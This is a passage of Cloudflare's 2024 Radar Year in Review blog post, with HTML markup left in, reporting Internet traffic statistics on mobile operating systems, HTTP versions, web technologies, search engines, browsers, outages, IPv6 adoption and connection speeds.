          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/4ipRtCowVftgad37ht9uMF/68958f72a47bbc179959c2d7ac6cdd72/traffic_-_post-quantum_worldwide.png" /&gt;

          &lt;div&gt;
            &lt;h3&gt;Globally, nearly one-third of mobile device traffic was from Apple iOS devices. Android had a &amp;gt;90% share of mobile device traffic in 29 countries/regions; peak iOS mobile device traffic share was over 60% in eight countries/regions.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#globally-nearly-one-third-of-mobile-device-traffic-was-from-apple-ios-devices-android-had-a-90-share-of-mobile-device-traffic-in-29-countries-regions-peak-ios-mobile-device-traffic-share-was-over-60-in-eight-countries-regions"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The two leading mobile device operating systems globally are &lt;a href="https://en.wikipedia.org/wiki/IOS"&gt;&lt;u&gt;Apple’s iOS&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://en.wikipedia.org/wiki/Android_(operating_system)"&gt;&lt;u&gt;Google’s Android&lt;/u&gt;&lt;/a&gt;, and by analyzing information in the &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent"&gt;&lt;u&gt;user agent&lt;/u&gt;&lt;/a&gt; reported with each request, we can get insight into the distribution of traffic by client operating system throughout the year. Again, we found that Android is responsible for the majority of mobile device traffic when aggregated globally, due to the wide distribution of price points, form factors, and capabilities.&lt;/p&gt;&lt;p&gt;Similar to &lt;a href="https://radar.cloudflare.com/year-in-review/2023#ios-vs-android"&gt;&lt;u&gt;2023’s findings&lt;/u&gt;&lt;/a&gt;, Android was once again &lt;a href="https://radar.cloudflare.com/year-in-review/2024#ios-vs-android"&gt;&lt;u&gt;responsible for just over two-thirds of mobile device traffic&lt;/u&gt;&lt;/a&gt;. Looking at the top countries for Android traffic, we find a greater than 95% share in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/sd#ios-vs-android"&gt;&lt;u&gt;Sudan&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/bd#ios-vs-android"&gt;&lt;u&gt;Bangladesh&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/tm#ios-vs-android"&gt;&lt;u&gt;Turkmenistan&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/mw#ios-vs-android"&gt;&lt;u&gt;Malawi&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/pg#ios-vs-android"&gt;&lt;u&gt;Papua New Guinea&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/sy#ios-vs-android"&gt;&lt;u&gt;Syria&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ye#ios-vs-android"&gt;&lt;u&gt;Yemen&lt;/u&gt;&lt;/a&gt;, up from just two countries in 2023. Similar to last year, we again found that countries/regions with higher levels of Android usage are largely in Africa, Oceania/Asia, and South America, and that many have lower levels of &lt;a href="https://ourworldindata.org/grapher/gross-national-income-per-capita?tab=table"&gt;&lt;u&gt;gross national income per capita&lt;/u&gt;&lt;/a&gt;. In these countries/regions, the availability of lower priced “budget” Android devices supports increased adoption.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/9bsuRwzYBybYpOiKqwLja/cbdafb60eab1913a91ec916899d1e807/connectivity_-_mobile_desktop.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Global distribution of mobile device traffic by operating system in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;In contrast, iOS adoption tops out in the 65% range in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/je#ios-vs-android"&gt;&lt;u&gt;Jersey&lt;/u&gt;&lt;/a&gt;, the &lt;a href="https://radar.cloudflare.com/year-in-review/2024/fo#ios-vs-android"&gt;&lt;u&gt;Faroe Islands&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/gg#ios-vs-android"&gt;&lt;u&gt;Guernsey&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/dk#ios-vs-android"&gt;&lt;u&gt;Denmark&lt;/u&gt;&lt;/a&gt;. Adoption rates of 50% or more were seen in a total of 26 countries/regions, including &lt;a href="https://radar.cloudflare.com/year-in-review/2024/no#ios-vs-android"&gt;&lt;u&gt;Norway&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/se#ios-vs-android"&gt;&lt;u&gt;Sweden&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/au#ios-vs-android"&gt;&lt;u&gt;Australia&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/jp#ios-vs-android"&gt;&lt;u&gt;Japan&lt;/u&gt;&lt;/a&gt;, the &lt;a href="https://radar.cloudflare.com/year-in-review/2024/us#ios-vs-android"&gt;&lt;u&gt;United States&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ca#ios-vs-android"&gt;&lt;u&gt;Canada&lt;/u&gt;&lt;/a&gt;. These locations likely have a greater ability to afford higher priced devices, owing to their comparatively higher gross national income per capita.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/QCfjlx0TgEotwU2wPm0hE/af1359f249aec86894b681249fe7ee70/adoption_-_Android_iOS_top_5.png" /&gt;

          &lt;div&gt;
            &lt;h3&gt;Globally, nearly half of web requests used HTTP/2, with 20.5% using HTTP/3.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#globally-nearly-half-of-web-requests-used-http-2-with-20-5-using-http-3"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;HTTP (HyperText Transfer Protocol) is the core protocol that the web relies upon. &lt;a href="https://datatracker.ietf.org/doc/html/rfc1945"&gt;&lt;u&gt;HTTP/1.0&lt;/u&gt;&lt;/a&gt; was first standardized in 1996, &lt;a href="https://www.rfc-editor.org/rfc/rfc2616.html"&gt;&lt;u&gt;HTTP/1.1&lt;/u&gt;&lt;/a&gt; in 1999, and &lt;a href="https://www.rfc-editor.org/rfc/rfc7540.html"&gt;&lt;u&gt;HTTP/2&lt;/u&gt;&lt;/a&gt; in 2015. The most recent version, &lt;a href="https://www.rfc-editor.org/rfc/rfc9114.html"&gt;&lt;u&gt;HTTP/3&lt;/u&gt;&lt;/a&gt;, was completed in 2022, and runs on top of a new transport protocol known as &lt;a href="https://blog.cloudflare.com/the-road-to-quic/"&gt;&lt;u&gt;QUIC&lt;/u&gt;&lt;/a&gt;. By running on top of QUIC, &lt;a href="https://www.cloudflare.com/learning/performance/what-is-http3/"&gt;&lt;u&gt;HTTP/3&lt;/u&gt;&lt;/a&gt; can deliver improved performance by mitigating the effects of packet loss and network changes, as well as establishing connections more quickly. HTTP/3 also provides encryption by default, which mitigates the risk of attacks. &lt;/p&gt;&lt;p&gt;Current versions of desktop and mobile Google Chrome (and Chromium-based variants), Mozilla Firefox, and Apple Safari &lt;a href="https://caniuse.com/?search=http%2F3"&gt;&lt;u&gt;all support HTTP/3 by default&lt;/u&gt;&lt;/a&gt;. Cloudflare makes HTTP/3 &lt;a href="https://developers.cloudflare.com/speed/optimization/protocol/http3/"&gt;&lt;u&gt;available for free&lt;/u&gt;&lt;/a&gt; to all of our customers, although not every customer chooses to enable it.&lt;/p&gt;&lt;p&gt;Analysis of the HTTP version negotiated for each request provides insight into the distribution of traffic by the various versions of the protocol aggregated across the year. (“HTTP/1.x” aggregates requests made over HTTP/1.0 and HTTP/1.1.) At a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#http-versions"&gt;&lt;u&gt;global&lt;/u&gt;&lt;/a&gt; level, 20.5% of requests in 2024 were made using HTTP/3. Another 29.9% of requests were made over the older HTTP/1.x versions, while HTTP/2 remained dominant, accounting for the remaining 49.6%.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/r7KQkjdsXXEtxHoEkFQbO/efb19d1bbd58bef3d657b96555d70103/adoption_-_HTTP_versions_global.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Global distribution of traffic by HTTP version in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Looking at version distribution geographically, we found eight countries/regions sending more than a third of their requests over HTTP/3, with &lt;a href="https://radar.cloudflare.com/year-in-review/2024/re#http-versions"&gt;&lt;u&gt;Reunion&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/lk#http-versions"&gt;&lt;u&gt;Sri Lanka&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/mn#http-versions"&gt;&lt;u&gt;Mongolia&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/gr#http-versions"&gt;&lt;u&gt;Greece&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/mk#http-versions"&gt;&lt;u&gt;North Macedonia&lt;/u&gt;&lt;/a&gt; comprising the top five as shown below. Eight other countries/regions, including &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ir#http-versions"&gt;&lt;u&gt;Iran&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ie#http-versions"&gt;&lt;u&gt;Ireland&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/hk#http-versions"&gt;&lt;u&gt;Hong Kong&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/cn#http-versions"&gt;&lt;u&gt;China&lt;/u&gt;&lt;/a&gt;, sent more than half of their requests over HTTP/1.x throughout 2024. More than half of requests were made over HTTP/2 in a total of 147 countries/regions.&lt;/p&gt;
          &lt;figure&gt;

          &lt;div&gt;
            &lt;h3&gt;React, PHP, and jQuery were among the most popular technologies used to build websites, while Hubspot, Google, and WordPress were among the most popular vendors of supporting services and platforms.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#react-php-and-jquery-were-among-the-most-popular-technologies-used-to-build-websites-while-hubspot-google-and-wordpress-were-among-the-most-popular-vendors-of-supporting-services-and-platforms"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Modern websites and applications are extremely complex, built on and integrating on a mix of frameworks, platforms, services, and tools. In order to deliver a seamless user experience, developers must ensure that all of these components happily coexist with each other. Using &lt;a href="https://radar.cloudflare.com/scan"&gt;&lt;u&gt;Cloudflare Radar’s URL Scanner&lt;/u&gt;&lt;/a&gt;, we again scanned websites associated with the &lt;a href="https://radar.cloudflare.com/domains"&gt;&lt;u&gt;top 5000 domains&lt;/u&gt;&lt;/a&gt; to identify the &lt;a href="https://radar.cloudflare.com/year-in-review/2024#website-technologies"&gt;&lt;u&gt;most popular technologies and services&lt;/u&gt;&lt;/a&gt; used across a dozen different categories. &lt;/p&gt;&lt;p&gt;In looking at core technologies used to build websites, &lt;a href="https://react.dev/"&gt;&lt;u&gt;React&lt;/u&gt;&lt;/a&gt; had a commanding lead over &lt;a href="https://vuejs.org/"&gt;&lt;u&gt;Vue.js&lt;/u&gt;&lt;/a&gt; and other JavaScript frameworks, &lt;a href="https://www.php.net/"&gt;&lt;u&gt;PHP&lt;/u&gt;&lt;/a&gt; was the most popular programming technology, and &lt;a href="https://jquery.com/"&gt;&lt;u&gt;jQuery&lt;/u&gt;&lt;/a&gt;’s share was 10x other popular JavaScript libraries.&lt;/p&gt;&lt;p&gt;Third-party services and platforms are also used by websites and applications to support things like analytics, content management, and marketing automation. Google Analytics remained the most widely used analytics provider, WordPress had a greater than 50% share among content management systems, and for marketing automation providers, category leader HubSpot had nearly twice the usage share of Marketo and MailChimp.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2fJS1OpqRlVCsZ9VOXdU89/c01320ff9d20da4ad2471de780a86033/adoption_-_top_website_technologies.png" /&gt;

            &lt;h3&gt;Go surpassed NodeJS as the most popular language used for making automated API requests.&lt;/h3&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Many dynamic websites and applications are built on &lt;a href="https://blog.cloudflare.com/2024-api-security-report/"&gt;&lt;u&gt;automated API calls&lt;/u&gt;&lt;/a&gt;, and we can use our unique visibility into Web traffic to identify the top languages these API clients are written in. Applying heuristics to API-related requests determined to not be coming from a person using a browser or native mobile application helps us to identify the language used to build the API client.&lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024#api-client-language-popularity"&gt;&lt;u&gt;Our analysis&lt;/u&gt;&lt;/a&gt; found that almost 12% of automated API requests are made by &lt;a href="https://go.dev/"&gt;&lt;u&gt;Go&lt;/u&gt;&lt;/a&gt;-based clients, with &lt;a href="https://nodejs.org/en/"&gt;&lt;u&gt;NodeJS&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.python.org/"&gt;&lt;u&gt;Python&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.java.com/"&gt;&lt;u&gt;Java&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://dotnet.microsoft.com/"&gt;&lt;u&gt;.NET&lt;/u&gt;&lt;/a&gt; holding smaller shares. Compared to &lt;a href="https://radar.cloudflare.com/year-in-review/2023#api-client-language-popularity"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt;, Go’s share increased by approximately 40%, allowing it to capture the top spot, while NodeJS’s share fell by just over 30%. Python and Java also saw their shares increase, while .NET’s fell.&lt;/p&gt;
          &lt;figure&gt;

            &lt;h3&gt;Google is the most popular search engine globally, across all platforms. On mobile devices/OS, Baidu is a distant second. Bing is a distant second across desktop and Windows devices, with DuckDuckGo second most popular on macOS. &lt;/h3&gt;

        &lt;p&gt;Protecting and accelerating websites and applications for millions of customers, Cloudflare is in a unique position to measure search engine market share data. Our methodology uses HTTP’s &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer"&gt;&lt;u&gt;referer header&lt;/u&gt;&lt;/a&gt; to identify the search engine sending traffic to customer sites and applications. The market share data is presented as an overall aggregate, as well as broken out by device type and operating system. (Device type and operating system data is derived from the &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent"&gt;&lt;u&gt;User-Agent&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Client_hints"&gt;&lt;u&gt;Client Hints&lt;/u&gt;&lt;/a&gt; headers accompanying a content request.)&lt;/p&gt;&lt;p&gt;Aggregated at a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#search-engine-market-share"&gt;&lt;u&gt;global&lt;/u&gt;&lt;/a&gt; level, Google referred the most traffic to Cloudflare customers, with a greater than 88% share across 2024. Yandex, Baidu, Bing, and DuckDuckGo round out the top five, all with single digit percentage shares. &lt;/p&gt;
          &lt;figure&gt;

For example, in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/kr#search-engine-market-share"&gt;&lt;u&gt;South Korea&lt;/u&gt;&lt;/a&gt;, Google is responsible for only two-thirds of referrals, while local platform &lt;a href="https://www.naver.com/"&gt;&lt;u&gt;Naver&lt;/u&gt;&lt;/a&gt; drives 29.2%, with local portal &lt;a href="https://www.daum.net/"&gt;&lt;u&gt;Daum&lt;/u&gt;&lt;/a&gt; also in the top five at 1.3%.&lt;/p&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Overall search engine market share in South Korea in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Google’s dominance is also blunted a bit on Windows devices, where it drives only 80% of referrals globally. Unsurprisingly, Bing holds the second spot for Windows users, with a 10.4% share. Yandex, Yahoo, and DuckDuckGo round out the top 5, all with shares below 5%.&lt;/p&gt;
          &lt;figure&gt;

          &lt;div&gt;
            &lt;h3&gt;Google Chrome is the most popular browser overall. While also true on MacOS devices, Safari usage is well ahead of Chrome on iOS devices. On Windows, Edge is the second most popular browser. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#google-chrome-is-the-most-popular-browser-overall-while-also-true-on-macos-devices-safari-usage-is-well-ahead-of-chrome-on-ios-devices-on-windows-edge-is-the-second-most-popular-browser"&gt;

          &lt;/div&gt;
        &lt;p&gt;Similar to our ability to measure search engine market share, Cloudflare is also in a unique position to measure browser market share. Our methodology uses information from the &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent"&gt;&lt;u&gt;User-Agent&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Client_hints"&gt;&lt;u&gt;Client Hints&lt;/u&gt;&lt;/a&gt; headers to identify the browser making content requests, along with the associated operating system. Browser market share data is presented as an overall aggregate, as well as broken out by device type and operating system. Note that the shares of browsers available on both desktop and mobile devices, such as Chrome or Safari, are presented in aggregate.&lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024#browser-market-share"&gt;&lt;u&gt;Globally&lt;/u&gt;&lt;/a&gt;, we found that 65.8% of requests came from Google’s Chrome browser across 2024, and that just 15.5% came from Apple’s Safari browser. Microsoft Edge, Mozilla Firefox, and the &lt;a href="https://www.samsung.com/us/support/owners/app/samsung-internet"&gt;&lt;u&gt;Samsung Internet browser&lt;/u&gt;&lt;/a&gt; rounded out the top five, all with shares below 10%.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1bEuEbqSrAqe57gnBTeL6c/4426dc0dbc8869d05344433535e0698a/adoption_-_browser_overall_worldwide.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Overall worldwide web browser market share in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Similar to the search engine statistics discussed above, differences are clearly visible when drilling down by location or platform. In some countries where iOS holds a larger market share than Android, Chrome remains the leading browser, but by a much lower margin. For example, in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/se#browser-market-share"&gt;&lt;u&gt;Sweden&lt;/u&gt;&lt;/a&gt;, Chrome’s share fell to 56.2%, while Safari’s increased to 22.5%. In &lt;a href="https://radar.cloudflare.com/year-in-review/2024/no#browser-market-share"&gt;&lt;u&gt;Norway&lt;/u&gt;&lt;/a&gt;, Chrome fell to just 50%, while Safari grew to 25.6%.&lt;/p&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Overall web browser market share in Norway in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;As the default browser on devices running iOS, Apple Safari was the most popular browser for iOS devices, commanding an 81.7% market share across the year, with Chrome at just 16.1%. And despite being the preinstalled default browser on Windows devices, Edge held just a 17.3% share, in comparison to Chrome’s 68.5%&lt;/p&gt;

            &lt;h3&gt;225 major Internet outages were observed around the world in 2024, with many due to government-directed regional and national shutdowns of Internet connectivity.&lt;/h3&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Throughout 2024, as we have over the last several years, we have written frequently about observed Internet outages, whether due to &lt;a href="https://blog.cloudflare.com/east-african-internet-connectivity-again-impacted-by-submarine-cable-cuts"&gt;&lt;u&gt;cable cuts&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/impact-of-verizons-september-30-outage-on-internet-traffic/"&gt;&lt;u&gt;unspecified technical issues&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/syria-iraq-algeria-exam-internet-shutdown"&gt;&lt;u&gt;government-directed shutdowns&lt;/u&gt;&lt;/a&gt;, or a number of other reasons covered in our quarterly summary posts (&lt;a href="https://blog.cloudflare.com/q1-2024-internet-disruption-summary"&gt;&lt;u&gt;Q1&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/q2-2024-internet-disruption-summary"&gt;&lt;u&gt;Q2&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/q3-2024-internet-disruption-summary"&gt;&lt;u&gt;Q3&lt;/u&gt;&lt;/a&gt;). The impacts of these outages can be significant, including significant economic losses and severely limited communications. The &lt;a href="https://radar.cloudflare.com/outage-center"&gt;&lt;u&gt;Cloudflare Radar Outage Center&lt;/u&gt;&lt;/a&gt; tracks these Internet outages, and uses Cloudflare traffic data for insights into their scope and duration.&lt;/p&gt;&lt;p&gt;Some of the outages seen through the year were short-lived, lasting just a few hours, while others stretched on for days or weeks. In the latter category, an Internet outage in &lt;a href="https://blog.cloudflare.com/q3-2024-internet-disruption-summary/#haiti"&gt;&lt;u&gt;Haiti&lt;/u&gt;&lt;/a&gt; dragged on for eight days in September because repair crews were barred from accessing a damaged submarine cable due to a business dispute, while shutdowns of mobile and fixed Internet providers in &lt;a href="https://blog.cloudflare.com/q3-2024-internet-disruption-summary/#bangladesh"&gt;&lt;u&gt;Bangladesh&lt;/u&gt;&lt;/a&gt; lasted for approximately 10 days in July. In the former category, &lt;a href="https://blog.cloudflare.com/q3-2024-internet-disruption-summary/#iraqi-kurdistan"&gt;&lt;u&gt;Iraq&lt;/u&gt;&lt;/a&gt; frequently experienced multi-hour nationwide Internet shutdowns intended to prevent cheating on academic exams — these contribute to the clustering visible in the timeline during June, July, August, and September.&lt;/p&gt;&lt;p&gt;Within the &lt;a href="https://radar.cloudflare.com/year-in-review/2024#internet-outages"&gt;&lt;u&gt;timeline&lt;/u&gt;&lt;/a&gt; on the Year in Review microsite, hovering over a dot will display metadata about that outage, and clicking on it will open a page with additional information. Below the map and timeline, we have added a bar graph illustrating the recorded reasons associated with the observed outages. In 2024, over half were due to government-directed shutdowns. If a country/region is selected, only outages and reasons for that country/region will be displayed.&lt;/p&gt;

            &lt;h3&gt;Aggregated across 2024, 28.5% of IPv6-capable requests were made over IPv6. India and Malaysia were the strongest countries, at 68.9% and 59.6% IPv6 adoption respectively.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#aggregated-across-2024-28-5-of-ipv6-capable-requests-were-made-over-ipv6-india-and-malaysia-were-the-strongest-countries-at-68-9-and-59-6-ipv6-adoption-respectively"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The IPv4 protocol still used by many Internet-connected devices was developed in the 1970s, and was never meant to handle the vast and growing scale of the modern Internet. An &lt;a href="https://www.rfc-editor.org/rfc/rfc1883"&gt;&lt;u&gt;initial specification for its successor&lt;/u&gt;&lt;/a&gt;, IPv6, was published in December 1995, evolving to a &lt;a href="https://www.rfc-editor.org/rfc/rfc2460"&gt;&lt;u&gt;draft standard&lt;/u&gt;&lt;/a&gt; three years later, offering an expanded address space intended to better support the expected growth in the number of Internet-connected devices. At this point, available IPv4 space has long since been &lt;a href="https://ipv4.potaroo.net/"&gt;&lt;u&gt;exhausted&lt;/u&gt;&lt;/a&gt;, and connectivity providers use solutions like &lt;a href="https://en.wikipedia.org/wiki/Network_address_translation"&gt;&lt;u&gt;Network Address Translation&lt;/u&gt;&lt;/a&gt; to stretch limited IPv4 resources. Hungry for IPv4 address space as their businesses and infrastructure grow, cloud and hosting providers are acquiring blocks of IPv4 address space for &lt;a href="https://auctions.ipv4.global/"&gt;&lt;u&gt;as much as \$30 - \$50 per address&lt;/u&gt;&lt;/a&gt;. &lt;/p&gt;&lt;p&gt;Cloudflare has been a vocal and active advocate for IPv6 since 2011, when we announced our &lt;a href="https://blog.cloudflare.com/introducing-cloudflares-automatic-ipv6-gatewa/"&gt;&lt;u&gt;Automatic IPv6 Gateway&lt;/u&gt;&lt;/a&gt;, which enabled free IPv6 support for all of our customers. In 2014, we enabled &lt;a href="https://blog.cloudflare.com/i-joined-cloudflare-on-monday-along-with-5-000-others"&gt;&lt;u&gt;IPv6 support by default for all of our customers&lt;/u&gt;&lt;/a&gt;, but not all customers choose to keep it enabled for a variety of reasons. Note that server-side support is only half of the equation for driving IPv6 adoption, as end user connections need to support it as well. (In reality, it is a bit more complex than that, but server and client side support across applications, operating systems, and network environments are the two primary requirements. From a network perspective, implementing IPv6 also brings a number of other &lt;a href="https://www.catchpoint.com/benefits-of-ipv6"&gt;&lt;u&gt;benefits&lt;/u&gt;&lt;/a&gt;.) By analyzing the IP version used for each request made to Cloudflare, aggregated throughout the year, we can get insight into the distribution of traffic by the various versions of the protocol.&lt;/p&gt;&lt;p&gt;At a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#ipv6-adoption"&gt;&lt;u&gt;global&lt;/u&gt;&lt;/a&gt; level, 28.5% of IPv6-capable (“&lt;a href="https://www.techopedia.com/definition/19025/dual-stack-network"&gt;&lt;u&gt;dual-stack&lt;/u&gt;&lt;/a&gt;”) requests were made over IPv6, up from 26.4% in &lt;a href="https://radar.cloudflare.com/year-in-review/2024?previousYear=true"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt;. &lt;a href="https://radar.cloudflare.com/year-in-review/2024/in#ipv6-adoption"&gt;&lt;u&gt;India&lt;/u&gt;&lt;/a&gt; was again the country with the highest level of IPv6 adoption, at 68.9%, carried in large part by &lt;a href="https://radar.cloudflare.com/adoption-and-usage/as55836?dateStart=2024-01-01&amp;amp;dateEnd=2024-12-01"&gt;&lt;u&gt;94% IPv6 adoption at Reliance Jio&lt;/u&gt;&lt;/a&gt;, one of the country’s largest Internet service providers. India was followed closely by &lt;a href="https://radar.cloudflare.com/year-in-review/2024/my#ipv6-adoption"&gt;&lt;u&gt;Malaysia&lt;/u&gt;&lt;/a&gt;, where 59.6% of dual-stacked requests were made over IPv6 during 2024, thanks to &lt;a href="https://radar.cloudflare.com/explorer?dataSet=http&amp;amp;groupBy=ases&amp;amp;loc=MY&amp;amp;dt=14d&amp;amp;metric=ip_version%2FIPv6"&gt;&lt;u&gt;strong IPv6 adoption rates across leading Internet providers&lt;/u&gt;&lt;/a&gt; within the country. IPv6 adoption in India was up from 66% in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/in?previousYear=true#ipv6-adoption"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt;, and in Malaysia, it was up from 57.3% &lt;a href="https://radar.cloudflare.com/year-in-review/2024/my?previousYear=true#ipv6-adoption"&gt;&lt;u&gt;last year&lt;/u&gt;&lt;/a&gt;. &lt;a href="https://radar.cloudflare.com/year-in-review/2024/sa#ipv6-adoption"&gt;&lt;u&gt;Saudi Arabia&lt;/u&gt;&lt;/a&gt; was the only other country with an IPv6 adoption rate above 50% this year, at 51.8%, whereas that list also included &lt;a href="https://radar.cloudflare.com/year-in-review/2023/vn#ipv6-adoption"&gt;&lt;u&gt;Vietnam&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2023/gr#ipv6-adoption"&gt;&lt;u&gt;Greece&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2023/fr#ipv6-adoption"&gt;&lt;u&gt;France&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2023/uy#ipv6-adoption"&gt;&lt;u&gt;Uruguay&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2023/th#ipv6-adoption"&gt;&lt;u&gt;Thailand&lt;/u&gt;&lt;/a&gt; in 2023. Thirty four countries/regions, including many in Africa, still have IPv6 adoption rates below 1%, while a total of 96 countries/regions have adoption rates below 10%.&lt;/p&gt;

            &lt;h3&gt;The top 10 countries ranked by Internet speed all had average download speeds above 200 Mbps. Spain was consistently among the top locations across measured Internet quality metrics.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-top-10-countries-ranked-by-internet-speed-all-had-average-download-speeds-above-200-mbps-spain-was-consistently-among-the-top-locations-across-measured-internet-quality-metrics"&gt;

        &lt;p&gt;As more and more of our everyday lives move online, including entertainment, work, education, finance, shopping, and even basic social and personal interaction, the quality of our Internet connections is arguably more important than ever, necessitating higher connection speeds and lower latency. Although Internet providers continue to evolve their service portfolios to offer increased connection speeds and reduced latency in order to support growth in use cases like videoconferencing, live streaming, and online gaming, consumer adoption is often mixed due to cost, availability, or other issues. By aggregating the results of &lt;a href="https://speed.cloudflare.com/"&gt;&lt;u&gt;speed.cloudflare.com&lt;/u&gt;&lt;/a&gt; tests taken during 2024, we can get a geographic perspective on &lt;a href="https://developers.cloudflare.com/radar/glossary/#connection-quality"&gt;&lt;u&gt;connection quality&lt;/u&gt;&lt;/a&gt; metrics including average download and upload speeds, and average idle and loaded latencies, as well as the distribution of the measurements.&lt;/p&gt;&lt;p&gt;In &lt;a href="https://radar.cloudflare.com/year-in-review/2024#internet-quality"&gt;&lt;u&gt;2024&lt;/u&gt;&lt;/a&gt;, Spain was a leader in download speed (292.6 Mbps) and upload speed (192.6 Mbps) metrics, and placed second globally for loaded latency (78.6 ms). (Loaded latency is the round-trip time when data-heavy applications are being used on the network.) Spain’s leadership in these connection quality metrics is supported by the strong progress that the country has made &lt;a href="https://ec.europa.eu/newsroom/dae/redirection/document/106695"&gt;&lt;u&gt;towards achieving the EU’s “Digital Decade” 